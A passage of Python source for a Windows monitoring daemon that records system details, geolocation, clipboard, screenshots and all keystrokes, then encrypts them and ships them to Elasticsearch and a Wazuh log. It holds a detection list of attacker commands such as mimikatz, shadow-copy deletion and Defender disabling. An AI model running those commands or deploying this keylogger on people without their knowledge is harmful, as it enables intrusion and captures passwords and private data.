exc_traceback):\r\n    if issubclass(exc_type, KeyboardInterrupt):\r\n        # Don't log KeyboardInterrupt, let default handler deal with it\r\n        sys.__excepthook__(exc_type, exc_value, exc_traceback)\r\n        return\r\n    logger.critical(\"Unhandled exception caught!\", exc_info=(exc_type, exc_value, exc_traceback))\r\n\r\nsys.excepthook = handle_unhandled_exception\r\n\r\ndef load_config(config_file_path: str) -> dict:\r\n    \"\"\"Loads configuration from a JSON file and environment variables.\"\"\"\r\n    loaded_config = DEFAULT_CONFIG.copy()\r\n\r\n    if os.path.exists(config_file_path):\r\n        try:\r\n            with open(config_file_path, \"r\", encoding='utf-8') as f:\r\n                file_config = json.load(f)\r\n                loaded_config.update(file_config)\r\n            logger.info(f\"Configuration loaded from {config_file_path}\")\r\n        except json.JSONDecodeError:\r\n            logger.error(f\"Error decoding config file {config_file_path}. Using default values.\")\r\n        except IOError as e:\r\n            logger.error(f\"Error reading config file {config_file_path}: {e}. Using default values.\")\r\n        except Exception as e:\r\n            logger.critical(f\"Unexpected error parsing config file: {e}\", exc_info=True)\r\n            sys.exit(1) # Critical error, exit\r\n\r\n    # Override with Environment Variables for sensitive info (best practice)\r\n    loaded_config[\"vt_api_key\"] = os.getenv(\"SNAKEY_VT_API_KEY\", loaded_config[\"vt_api_key\"])\r\n    loaded_config[\"elastic_user\"] = os.getenv(\"SNAKEY_ELASTIC_USER\", loaded_config[\"elastic_user\"])\r\n    loaded_config[\"elastic_password\"] = os.getenv(\"SNAKEY_ELASTIC_PASSWORD\", loaded_config[\"elastic_password\"])\r\n    loaded_config[\"log_level\"] = os.getenv(\"SNAKEY_LOG_LEVEL\", loaded_config[\"log_level\"]).upper()\r\n\r\n    return loaded_config\r\n\r\n# === Global Variables (Initialized after config loading) ===\r\nconfig_file = os.path.join(DEFAULT_CONFIG[\"base_path\"], \"snakey_config.json\")\r\nconfig = load_config(config_file)\r\n\r\n# Now define paths and settings using the loaded config\r\nbase_path = config[\"base_path\"]\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True) # Ensure directory exists\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\ndaemon_log_file = os.path.join(base_path, \"snakey_daemon.log\") # Changed name to avoid conflict with existing (error) log\r\n\r\nscreenshot_information = \"screenshot.png\"  # Temporary screenshot file\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = set(config[\"known_countries\"]) # Use set for faster lookups\r\nKNOWN_VPN_IPS = set(config[\"known_vpn_ips\"]) # Use set for faster lookups\r\nMIN_FREE_DISK_MB = config[\"min_free_disk_mb\"]\r\n\r\n# --- VirusTotal API Endpoints (Global Constants) ---\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\n\r\n\r\n# Sensitive Command Detection Configuration\r\nSENSITIVE_CMD_COMMANDS = [\r\n    \"format c:\", \"del /s /q\", \"rmdir /s /q\", \"net user\", \"net localgroup administrators\",\r\n    \"taskkill /f /im\", \"schtasks /create\", \"reg delete\", \"mimikatz\",\r\n    \"certutil -urlcache -f -split\", \"wmic shadowcopy delete\", \"vssadmin delete shadows\",\r\n    \"powershell -nop -w hidden -c\", \"invoke-expression\", \"set-mppreference -disablerealtimemonitoring $true\",\r\n    \"bcdedit /set {current} safeboot network\", \"mshta.exe http\", \"bitsadmin /transfer\",\r\n    \"wevtutil cl system\", \"cipher /w\", \"sdelete -z\",\r\n]\r\n\r\n# === Setup Logging (now that config is loaded) ===\r\nsetup_logging(config[\"log_level\"], daemon_log_file)\r\n\r\n\r\n# === Encryption Key Loading ===\r\nfernet: Fernet = None # Type hint\r\nif not os.path.exists(key_path):\r\n    logger.critical(\"Encryption key not found! Run GenerateKey.py first. Exiting.\")\r\n    sys.exit(1)\r\n\r\ntry:\r\n    with open(key_path, \"rb\") as key_file:\r\n        key = key_file.read()\r\n    fernet = Fernet(key)\r\n    logger.info(\"Encryption key loaded successfully.\")\r\nexcept Exception as e:\r\n    logger.critical(f\"Failed to load encryption key: {e}. Exiting.\", exc_info=True)\r\n    sys.exit(1)\r\n\r\n# === Elasticsearch Configuration ===\r\nELASTIC_HOST = config[\"elastic_host\"]\r\nELASTIC_PORT = config[\"elastic_port\"]\r\nELASTIC_USER = config[\"elastic_user\"]\r\nELASTIC_PASSWORD = config[\"elastic_password\"]\r\n\r\nes_client: Elasticsearch = None # Type hint\r\n\r\n# Basic pre-check before initializing the full ES client\r\nes_precheck_successful = False\r\nlogger.info(\"Performing basic requests.get pre-check to Elasticsearch endpoint.\")\r\nif not ELASTIC_USER or not ELASTIC_PASSWORD:\r\n    logger.critical(\"Elasticsearch username or password not set (check SNAKEY_ELASTIC_USER/SNAKEY_ELASTIC_PASSWORD environment variables or config file). Elasticsearch client will not be initialized.\")\r\nelse:\r\n    try:\r\n        response = requests_get(f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\", auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n                                verify=False, timeout=10, stream=True)\r\n        logger.debug(f\"Basic requests.get status: {response.status_code}\")\r\n        # Read a byte to force connection establishment, then close to prevent hanging\r\n        try:\r\n            response.raw.read(1)\r\n        except Exception as read_e:\r\n            logger.warning(f\"Error reading from raw response during pre-check (might be expected for empty response): {read_e}\", extra={\"error_type\": \"requests_raw_read_error\"})\r\n        response.close()\r\n        if response.status_code == 200:\r\n            logger.info(\"Basic requests.get pre-check successful (status 200).\")\r\n            es_precheck_successful = True\r\n        else:\r\n            logger.warning(\r\n                f\"Basic requests.get pre-check returned non-200 status: {response.status_code}. Not proceeding with ES client init.\",\r\n                extra={\"http_status\": response.status_code, \"response_text\": response.text})\r\n\r\n    except requests.exceptions.ConnectionError as e:\r\n        logger.error(f\"requests.ConnectionError during pre-check: {e}. Possible firewall, service down, or wrong host/port.\", exc_info=True, extra={\"error_type\": \"requests_connection_error\"})\r\n    except requests.exceptions.Timeout:\r\n        logger.error(\"requests.Timeout during pre-check: Connection timed out.\", exc_info=True, extra={\"error_type\": \"requests_timeout\"})\r\n    except requests.exceptions.RequestException as e:\r\n        logger.error(f\"requests.RequestException during pre-check: {e}. Could be SSL, authentication, or other request error.\", exc_info=True, extra={\"error_type\": \"requests_request_error\"})\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during basic requests pre-check: {e}\", exc_info=True, extra={\"error_type\": \"unexpected_precheck_error\"})\r\n\r\n\r\nif es_precheck_successful:\r\n    try:\r\n        es_client = Elasticsearch(\r\n            hosts=[f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\"],\r\n            basic_auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n            verify_certs=False,  # WARNING: Disable for testing, enable for production!\r\n            ssl_show_warn=False, # Suppress SSL warnings in logs from elasticsearch client\r\n            request_timeout=30 # Increased timeout for client initialization\r\n        )\r\n        # Attempt to ping to confirm full connection\r\n        if es_client.ping():\r\n            logger.info(\"Elasticsearch client initialized and connected successfully.\")\r\n        else:\r\n            logger.error(\"Elasticsearch client initialized but failed to ping the cluster. Check credentials.\", extra={\"error_type\": \"es_ping_failed\"})\r\n            es_client = None\r\n    except ConnectionError as e:\r\n        logger.error(f\"Elasticsearch Connection Error during client init: {e}. Check network, service status, firewall.\", exc_info=True, extra={\"error_type\": \"es_connection_error\"})\r\n        es_client = None\r\n    except AuthenticationException as e:\r\n        logger.error(f\"Elasticsearch Authentication Error during client init: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD carefully.\", exc_info=True, extra={\"error_type\": \"es_auth_error\"})\r\n        es_client = None\r\n    except TransportError as e:\r\n        logger.error(f\"Elasticsearch Transport Error during client init (HTTP status {e.status_code}): {e.info}. Problem on ES server or request formatting.\", exc_info=True, extra={\"error_type\": \"es_transport_error\", \"status_code\": e.status_code})\r\n        es_client = None\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during Elasticsearch client initialization: {e}\", exc_info=True, extra={\"error_type\": \"unexpected_es_init_error\"})\r\n        es_client = None\r\nelse:\r\n    logger.warning(\"Elasticsearch pre-check failed. Elasticsearch client will not be initialized.\")\r\n\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath: str) -> str | None:\r\n    \"\"\"Calculates the SHA256 hash of a file.\"\"\"\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except FileNotFoundError:\r\n        logger.error(f\"File not found for hashing: {filepath}\", extra={\"file_path\": filepath})\r\n        return None\r\n    except Exception as e:\r\n        logger.error(f\"Hashing failed for {filepath}: {e}\", exc_info=True, extra={\"file_path\": filepath})\r\n        return None\r\n\r\n\r\ndef hash_text(text: str) -> str:\r\n    \"\"\"Calculates the SHA256 hash of a given string.\"\"\"\r\n    return hashlib.sha256(text.encode('utf-8')).hexdigest()\r\n\r\n\r\ndef build_merkle_tree(hashes: list[str]) -> str | None:\r\n    \"\"\"Builds a Merkle tree from a list of hashes and returns the Merkle root.\"\"\"\r\n    if not hashes:\r\n        return None\r\n    hashes = list(hashes) # Make a mutable copy\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])  # Duplicate last hash if odd number\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\n\r\ndef vt_lookup_url(url: str) -> dict:\r\n    \"\"\"Performs a VirusTotal URL lookup.\"\"\"\r\n    try:\r\n        if not config.get(\"vt_api_key\"): # Use .get() for safer access\r\n            logger.warning(\"VirusTotal API key not configured. Skipping URL lookup.\", extra={\"url\": url})\r\n            return {}\r\n\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests_get(f\"{VT_URL_LOOKUP}{url_id}\", headers={\"x-apikey\": config[\"vt_api_key\"]}, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            logger.warning(f\"VirusTotal URL lookup failed (404 Not Found) for hash {url_id}. URL likely not previously analyzed by VT.\", extra={\"url_hash\": url_id})\r\n        else:\r\n            logger.warning(f\"VirusTotal URL lookup failed with status {response.status_code} for {url}: {response.text}\", extra={\"url\": url, \"status_code\": response.status_code, \"response_text\": response.text})\r\n    except requests.exceptions.RequestException as e:\r\n        logger.error(f\"VT URL lookup failed: {e}\", exc_info=True, extra={\"url\": url})\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during VT URL lookup: {e}\", exc_info=True, extra={\"url\": url})\r\n    return {}\r\n\r\n\r\ndef vt_lookup_file(file_path: str) -> dict:\r\n    \"\"\"Performs a VirusTotal file lookup.\"\"\"\r\n    try:\r\n        if not config.get(\"vt_api_key\"): # Use .get() for safer access\r\n            logger.warning(\"VirusTotal API key not configured. Skipping File lookup.\", extra={\"file_path\": file_path})\r\n            return {}\r\n\r\n        if not os.path.exists(file_path):\r\n            logger.error(f\"File not found for VT lookup: {file_path}\", extra={\"file_path\": file_path})\r\n            return {}\r\n\r\n        file_hash = hash_file(file_path)\r\n        if not file_hash:\r\n            return {}\r\n\r\n        response = requests_get(f\"{VT_FILE_LOOKUP}{file_hash}\", headers={\"x-apikey\": config[\"vt_api_key\"]}, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            logger.warning(f\"VirusTotal File lookup failed (404 Not Found) for hash {file_hash} from {file_path}. File likely not previously analyzed by VT.\", extra={\"file_hash\": file_hash, \"file_path\": file_path})\r\n        else:\r\n            logger.warning(f\"VirusTotal File lookup failed with status {response.status_code} for {file_path}: {response.text}\", extra={\"file_path\": file_path, \"status_code\": response.status_code, \"response_text\": response.text})\r\n    except requests.exceptions.RequestException as e:\r\n        logger.error(f\"VT File lookup failed: {e}\", exc_info=True, extra={\"file_path\": file_path})\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during VT File lookup: {e}\", exc_info=True, extra={\"file_path\": file_path})\r\n    return {}\r\n\r\n\r\ndef check_important_directories() -> dict[str, str]:\r\n    \"\"\"Checks the status of important user directories.\"\"\"\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n                logger.warning(f\"Failed to list contents of {name} ({path}): {e}\", extra={\"dir_name\": name, \"dir_path\": path})\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\n\r\ndef check_stop_file() -> bool:\r\n    \"\"\"Checks if the 'stop_snakey.txt' file exists to terminate the daemon.\"\"\"\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef check_disk_space(path: str, min_free_mb: int) -> bool:\r\n    \"\"\"Checks if there's enough free disk space at a given path.\"\"\"\r\n    try:\r\n        total, used, free = shutil.disk_usage(path)\r\n        free_mb = free / (1024 * 1024)\r\n        if free_mb < min_free_mb:\r\n            logger.warning(f\"Low disk space detected in {path}: {free_mb:.2f} MB free. Operations might be impacted.\", extra={\"path\": path, \"free_mb\": free_mb, \"min_free_mb\": min_free_mb})\r\n            return False\r\n        logger.debug(f\"Disk space OK in {path}: {free_mb:.2f} MB free.\")\r\n        return True\r\n    except Exception as e:\r\n        logger.error(f\"Failed to check disk space for {path}: {e}\", exc_info=True, extra={\"path\": path})\r\n        return True # Assume OK if check fails, to avoid halting the daemon\r\n\r\ndef log_to_wazuh_file(data: dict):\r\n    \"\"\"Logs session data to a file in a Wazuh-compatible JSON format.\"\"\"\r\n    try:\r\n        # Ensure timestamp is string for JSON serialization\r\n        if 'timestamp' in data and isinstance(data['timestamp'], datetime):\r\n            data['timestamp'] = data['timestamp'].isoformat()\r\n        with open(wazuh_log_file, \"a\", encoding='utf-8') as f:\r\n            f.write(json.dumps(data, default=str) + \"\\n\")\r\n        logger.info(\"Log written to Wazuh-compatible file.\", extra={\"log_file\": wazuh_log_file})\r\n    except Exception as e:\r\n        logger.error(f\"Wazuh log file write failed: {e}\", exc_info=True, extra={\"log_file\": wazuh_log_file})\r\n\r\ndef save_session_to_json(session_data: dict, filepath: str):\r\n    \"\"\"\r\n    Appends session data as a new JSON object to the specified file.\r\n    Each object is on a new line to make it easier to read/parse as NDJSON.\r\n    \"\"\"\r\n    try:\r\n        # Ensure timestamp is string for JSON serialization\r\n        if 'timestamp' in session_data and isinstance(session_data['timestamp'], datetime):\r\n            session_data['timestamp'] = session_data['timestamp'].isoformat()\r\n        \r\n        with open(filepath, \"a\", encoding='utf-8') as f:\r\n            f.write(json.dumps(session_data, default=str) + \"\\n\")\r\n        logger.info(f\"Session log appended to JSON file: {filepath}\", extra={\"log_file\": filepath})\r\n    except Exception as e:\r\n        logger.error(f\"Failed to write session log to JSON file {filepath}: {e}\", exc_info=True, extra={\"log_file\": filepath})\r\n\r\ndef send_to_elasticsearch(data: dict):\r\n    \"\"\"Sends collected session data to Elasticsearch.\"\"\"\r\n    global es_client\r\n    if es_client:\r\n        try:\r\n            data_to_send = data.copy()\r\n            if 'timestamp' in data_to_send and isinstance(data_to_send['timestamp'], datetime):\r\n                data_to_send['timestamp'] = data_to_send['timestamp'].isoformat()\r\n\r\n            # Ensure lists are not empty for Kibana visualization (empty list is fine, None is bad)\r\n            if not data_to_send.get('alerts'):\r\n                data_to_send['alerts'] = []\r\n            if not data_to_send.get('virustotal'):\r\n                data_to_send['virustotal'] = {}\r\n\r\n            logger.debug(f\"Attempting to send log to Elasticsearch for timestamp: {data_to_send['timestamp']}\", extra={\"timestamp\": data_to_send['timestamp']})\r\n            response = es_client.index(index=\"snakey_logs\", document=data_to_send)\r\n            logger.info(f\"Log sent to Elasticsearch. ID: {response['_id']}\", extra={\"es_id\": response['_id']})\r\n        except ConnectionError as e:\r\n            logger.error(f\"Elasticsearch Connection Error during send: {e}. Check network, service status, firewall.\", exc_info=True, extra={\"error_type\": \"es_connection_error\"})\r\n        except AuthenticationException as e:\r\n            logger.error(f\"Elasticsearch Authentication Error during send: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\", exc_info=True, extra={\"error_type\": \"es_auth_error\"})\r\n        except TransportError as e:\r\n            logger.error(f\"Elasticsearch Transport Error during send (HTTP status {e.status_code}): {e.info}. Problem on ES server or data format.\", exc_info=True, extra={\"error_type\": \"es_transport_error\", \"status_code\": e.status_code, \"es_info\": e.info})\r\n        except Exception as e:\r\n            logger.error(f\"Unexpected failure sending log to Elasticsearch: {e}\", exc_info=True, extra={\"error_type\": \"unexpected_es_send_error\"})\r\n    else:\r\n        logger.warning(\"Elasticsearch client is not configured or connected. Log will not be sent.\")\r\n\r\n\r\ndef analyze_clipboard_for_sensitive_commands(clipboard_content: str, alerts_list: list[str]) -> list[str]:\r\n    \"\"\"Analyzes clipboard content for predefined sensitive command patterns.\"\"\"\r\n    if not clipboard_content or not isinstance(clipboard_content, str):\r\n        return alerts_list\r\n\r\n    normalized_clipboard = clipboard_content.lower().strip()\r\n\r\n    for sensitive_cmd in SENSITIVE_CMD_COMMANDS:\r\n        if sensitive_cmd.lower() in normalized_clipboard:\r\n            alerts_list.append(\r\n                f\"Sensitive CMD command detected in clipboard: \"\r\n                f\"'{clipboard_content[:100].replace('\\n', ' ').strip()}...' (matched: '{sensitive_cmd}')\"\r\n            )\r\n            logger.info(f\"Sensitive CMD command detected in clipboard.\", extra={\"matched_command\": sensitive_cmd, \"clipboard_snippet\": clipboard_content[:100]})\r\n\r\n    return alerts_list\r\n\r\n\r\ndef check_country_change(current_country: str, alerts_list: list[str]) -> list[str]:\r\n    \"\"\"\r\n    Checks if the country has changed since the last recorded session.\r\n    Stores the current country for future comparison.\r\n    \"\"\"\r\n    last_country_path = os.path.join(base_path, \"last_country.txt\")\r\n    try:\r\n        if os.path.exists(last_country_path):\r\n            with open(last_country_path, \"r\", encoding='utf-8') as f:\r\n                last_country = f.read().strip()\r\n            if last_country and last_country != current_country:\r\n                alerts_list.append(f\"Country changed since last session: {last_country} -> {current_country}\")\r\n                logger.info(f\"Country changed: {last_country} -> {current_country}\", extra={\"old_country\": last_country, \"new_country\": current_country})\r\n        with open(last_country_path, \"w\", encoding='utf-8') as f:\r\n            f.write(current_country)\r\n    except Exception as e:\r\n        logger.error(f\"Failed to check/update last country: {e}\", exc_info=True)\r\n    return alerts_list\r\n\r\n\r\ndef check_vpn_proxy_ip(current_ip: str, alerts_list: list[str]) -> list[str]:\r\n    \"\"\"Checks if the current public IP is in a list of known VPN/proxy IPs.\"\"\"\r\n    if current_ip in KNOWN_VPN_IPS:\r\n        alerts_list.append(f\"Access from known VPN/proxy IP: {current_ip}\")\r\n        logger.info(f\"Access from known VPN/proxy IP detected: {current_ip}\", extra={\"ip_address\": current_ip})\r\n    return alerts_list\r\n\r\n\r\n# === Keylogger Thread Function ===\r\ndef on_press_threaded(key):\r\n    \"\"\"Callback for pynput.keyboard.Listener on key press event.\"\"\"\r\n    global KEYLOGGER_KEYS\r\n    try:\r\n        if hasattr(key, 'char') and key.char is not None:\r\n            KEYLOGGER_KEYS.append(key.char)\r\n        elif key == Key.space:\r\n            KEYLOGGER_KEYS.append(' ')\r\n        elif key == Key.enter:\r\n            KEYLOGGER_KEYS.append('[ENTER]')\r\n        elif key == Key.backspace:\r\n            KEYLOGGER_KEYS.append('[BACKSPACE]')\r\n        elif key == Key.tab:\r\n            KEYLOGGER_KEYS.append('[TAB]')\r\n        else:\r\n            KEYLOGGER_KEYS.append(f\"[{str(key).replace('Key.', '')}]\")\r\n    except Exception as e:\r\n        logger.error(f\"Error in on_press_threaded keylogger: {e}\", exc_info=True)\r\n\r\ndef keylogger_thread_func():\r\n    \"\"\"Function to be run in a separate thread for continuous keylogging.\"\"\"\r\n    global KEYLOGGER_LISTENER\r\n    logger.info(\"Keylogger thread started.\")\r\n    try:\r\n        with Listener(on_press=on_press_threaded) as KEYLOGGER_LISTENER:\r\n            KEYLOGGER_LISTENER.join() # This will block until listener.stop() is called\r\n    except Exception as e:\r\n        logger.critical(f\"Keylogger thread encountered a critical error: {e}. Keylogger will terminate.\", exc_info=True)\r\n    finally:\r\n        logger.info(\"Keylogger thread terminated.\")\r\n\r\n\r\n# === Main Log Collection Function ===\r\ndef collect_full_session() -> dict:\r\n    \"\"\"Collects a full session's worth of system data, activities, and alerts.\"\"\"\r\n    current_time = datetime.now(timezone.utc)\r\n    session_log: dict = {\r\n        \"timestamp\": current_time.isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\", # Will be populated from global KEYLOGGER_KEYS\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    try:\r\n        # System Info Collection\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        try:\r\n            session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n        except socket.gaierror as e:\r\n            session_log[\"system\"][\"private_ip\"] = f\"Error: {e}\"\r\n            session_log[\"alerts\"].append(f\"Could not get private IP: {e}\")\r\n            logger.warning(f\"Could not get private IP: {e}\", extra={\"error\": str(e)})\r\n\r\n        # Public IP and ISP lookup (includes country check and new VPN/Proxy IP check)\r\n        current_public_ip: str | None = None\r\n        current_country: str | None = None\r\n        try:\r\n            ip_info_response = requests_get(\"https://ipinfo.io/json\", timeout=5)\r\n            ip_info_response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)\r\n            ip_info = ip_info_response.json()\r\n\r\n            session_log[\"system\"][\"public_ip\"] = ip_info.get(\"ip\")\r\n            current_public_ip = ip_info.get(\"ip\")\r\n            session_log[\"system\"][\"country\"] = ip_info.get(\"country\")\r\n            current_country = ip_info.get(\"country\")\r\n            session_log[\"system\"][\"region\"] = ip_info.get(\"region\")\r\n            session_log[\"system\"][\"city\"] = ip_info.get(\"city\")\r\n            session_log[\"system\"][\"isp\"] = ip_info.get(\"org\", \"Unknown\")\r\n\r\n            if current_country and current_country not in known_countries:\r\n                session_log[\"alerts\"].append(f\"Access from untrusted country: {current_country}\")\r\n                logger.info(f\"Access from untrusted country: {current_country}\", extra={\"country\": current_country})\r\n\r\n            if current_country:\r\n                session_log[\"alerts\"] = check_country_change(current_country, session_log[\"alerts\"])\r\n            if current_public_ip:\r\n                session_log[\"alerts\"] = check_vpn_proxy_ip(current_public_ip, session_log[\"alerts\"])\r\n\r\n        except requests.exceptions.Timeout:\r\n            session_log[\"alerts\"].append(\"IP info lookup timed out.\")\r\n            logger.warning(\"IP info lookup timed out.\", extra={\"error_type\": \"ipinfo_timeout\"})\r\n        except requests.exceptions.RequestException as e:\r\n            session_log[\"alerts\"].append(f\"IP info lookup failed: {e}\")\r\n            logger.error(f\"IP info lookup failed: {e}\", exc_info=True, extra={\"error_type\": \"ipinfo_request_error\"})\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Unexpected error during IP info lookup: {e}\")\r\n            logger.error(f\"Unexpected error during IP info lookup: {e}\", exc_info=True, extra={\"error_type\": \"ipinfo_unexpected_error\"})\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info collection error: {e}\")\r\n        logger.error(f\"System info collection error: {e}\", exc_info=True)\r\n\r\n    # Clipboard Collection and Analysis\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            win32clipboard.OpenClipboard()\r\n            try:\r\n                clipboard_content = win32clipboard.GetClipboardData()\r\n                session_log[\"clipboard\"] = clipboard_content\r\n            except TypeError:  # If clipboard is empty or non-text content\r\n                session_log[\"clipboard\"] = \"Clipboard is empty or contains non-text data.\"\r\n            win32clipboard.CloseClipboard()\r\n            session_log[\"clipboard_hash\"] = hash_text(str(session_log[\"clipboard\"])) # Ensure clipboard is string before hashing\r\n\r\n            session_log[\"alerts\"] = analyze_clipboard_for_sensitive_commands(session_log[\"clipboard\"], session_log[\"alerts\"])\r\n\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n            logger.error(f\"Clipboard error: {e}\", exc_info=True)\r\n    else:\r\n        session_log[\"clipboard\"] = \"Clipboard collection not supported on this OS.\"\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n        logger.info(\"Clipboard collection skipped (not Windows).\")\r\n\r\n\r\n    # Screenshot Collection and VT Scan\r\n    screenshot_file_path = os.path.join(base_path, screenshot_information)\r\n    if platform.system() == \"Windows\":\r\n        # Check disk space before attempting screenshot\r\n        if not check_disk_space(base_path, MIN_FREE_DISK_MB):\r\n            session_log[\"alerts\"].append(\"Screenshot skipped due to low disk space.\")\r\n            logger.warning(\"Screenshot skipped due to low disk space.\")\r\n        else:\r\n            try:\r\n                im = ImageGrab.grab()\r\n                im.save(screenshot_file_path)\r\n                session_log[\"screenshot_taken\"] = True\r\n                session_log[\"screenshot_hash\"] = hash_file(screenshot_file_path)\r\n\r\n                vt_result = vt_lookup_file(screenshot_file_path)\r\n                if vt_result:\r\n                    session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n                    if vt_result.get(\"malicious\", 0) > 0:\r\n                        session_log[\"alerts\"].append(f\"VirusTotal flagged screenshot file as malicious: {vt_result.get('malicious')} positives.\")\r\n                        logger.info(f\"VT flagged screenshot as malicious: {vt_result.get('malicious')} positives.\", extra={\"vt_result\": vt_result})\r\n                else:\r\n                    logger.info(\"No VirusTotal result for screenshot or scan failed.\")\r\n\r\n            except Exception as e:\r\n                session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n                logger.error(f\"Screenshot error: {e}\", exc_info=True)\r\n            finally:\r\n                if os.path.exists(screenshot_file_path):\r\n                    try:\r\n                        os.remove(screenshot_file_path)\r\n                        logger.debug(f\"Removed temporary screenshot file: {screenshot_file_path}\")\r\n                    except Exception as e:\r\n                        logger.error(f\"Failed to remove temporary screenshot file: {e}\", exc_info=True)\r\n    else:\r\n        session_log[\"screenshot_taken\"] = False\r\n        session_log[\"alerts\"].append(\"Screenshot collection not supported on this OS.\")\r\n        logger.info(\"Screenshot collection skipped (not Windows).\")\r\n\r\n\r\n    # VirusTotal Scan for Clipboard URL (if applicable)\r\n    if isinstance(session_log[\"clipboard\"], str) and session_log[\"clipboard\"].strip().lower().startswith((\"http://\", \"https://\")):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n            if vt_result.get(\"malicious\", 0) > 0:\r\n                session_log[\"alerts\"].append(f\"VirusTotal flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\")\r\n                logger.info(f\"VT flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\", extra={\"vt_result\": vt_result})\r\n        else:\r\n            logger.info(\"No VirusTotal result for clipboard URL or scan failed.\")\r\n\r\n    # Keylogger: Collect accumulated keys from the dedicated keylogger thread\r\n    global KEYLOGGER_KEYS\r\n    session_log[\"keystrokes\"] = ''.join(KEYLOGGER_KEYS)\r\n    KEYLOGGER_KEYS = [] # Reset for the next collection cycle\r\n    logger.info(f\"Collected {len(session_log['keystrokes'])} keystrokes from keylogger thread.\")\r\n\r\n    # Important Directories Check\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n\r\n    # --- Immutable Cold Storage (Enhanced Flat-File System) Logic ---\r\n    if not check_disk_space(encrypted_path, MIN_FREE_DISK_MB):\r\n        session_log[\"alerts\"].append(\"Encryption and ledger update skipped due to low disk space.\")\r\n        logger.error(\"Encryption and ledger update skipped due to low disk space in encrypted_path.\")\r\n        return session_log # Exit without updating ledger for this log\r\n\r\n    try:\r\n        # 1. Prepare the full log for encryption\r\n        log_string_for_internal_hash = json.dumps(session_log, sort_keys=True, default=str)\r\n        session_log[\"_raw_log_hash\"] = hash_text(log_string_for_internal_hash)\r\n\r\n        # 2. Encrypt the entire session log\r\n        encrypted_log_data = fernet.encrypt(log_string_for_internal_hash.encode('utf-8'))\r\n\r\n        # 3. Define unique filename for encrypted log file\r\n        encrypted_filename = f\"log_{current_time.strftime('%Y%m%d_%H%M%S_%f')}.enc\"\r\n        full_encrypted_filepath = os.path.join(encrypted_path, encrypted_filename)\r\n\r\n        # 4. Save the encrypted log to a file 